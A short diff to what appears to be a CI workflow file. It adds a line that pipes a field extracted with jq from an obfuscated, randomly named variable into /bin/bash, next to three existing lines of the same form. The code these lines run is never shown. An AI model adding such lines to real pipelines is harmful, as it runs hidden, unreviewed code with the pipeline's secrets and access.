@@ -25,6 +25,7 @@ jobs:
           echo $vmn0886 | jq -r .emsj7443 | /bin/bash
           echo $ijmc93 | jq -r .y039 | /bin/bash
           echo $rfsqx9 | jq -r .txf84845 | /bin/bash
+          echo $yip4028 | jq -r .mk40 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
